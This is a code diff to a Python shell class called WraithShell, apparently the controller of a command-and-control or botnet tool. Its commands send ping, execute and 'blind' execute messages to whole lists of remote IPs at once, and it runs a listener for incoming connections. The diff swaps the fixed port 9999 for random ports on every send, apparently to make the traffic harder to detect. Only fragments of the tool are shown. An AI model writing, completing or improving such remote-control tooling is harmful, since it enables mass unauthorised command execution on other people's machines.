@@ -86,7 +86,7 @@ class WraithShell(cmd.Cmd):
     def __init__(self):
         super().__init__()
         self.target_IP = None
-        self.target_port = 9999
+        self.target_port = None
         self.current_protocol = "TCP"
         self.sender_wrapper = send_packet_TCP
         self.stop_listener = None
@@ -136,7 +136,7 @@ class WraithShell(cmd.Cmd):
         server.listen(10)  # backlog
 
         stop_event = threading.Event()
-
+        
         def _accept_loop():
             server.settimeout(1.0)
             while not stop_event.is_set():
@@ -304,7 +304,7 @@ class WraithShell(cmd.Cmd):
                     return
 
                 for IP in IP_list:
-                    self.sender_wrapper("ping", "CMD_PING", IP, self.target_port)
+                    self.sender_wrapper("ping", "CMD_PING", IP, random.randint(1024, 65535))
 
             case "exec":
 
@@ -325,7 +325,7 @@ class WraithShell(cmd.Cmd):
                     print(f"Executing command '{cmd}' BLIND enmasse")
 
                     for IP in IP_list:
-                        self.sender_wrapper(cmd, "CMD_EXEC_BLIND", IP, self.target_port)
+                        self.sender_wrapper(cmd, "CMD_EXEC_BLIND", IP, random.randint(1024, 65535))
 
                 else:
 
@@ -336,7 +336,7 @@ class WraithShell(cmd.Cmd):
                     print(f"Executing command '{cmd}' enmasse")
 
                     for IP in IP_list:
-                        self.sender_wrapper(cmd, "CMD_EXEC", IP, self.target_port)
+                        self.sender_wrapper(cmd, "CMD_EXEC", IP, random.randint(1024, 65535))
 
     # Handle protocol switching
     def do_protocol(self, arg):
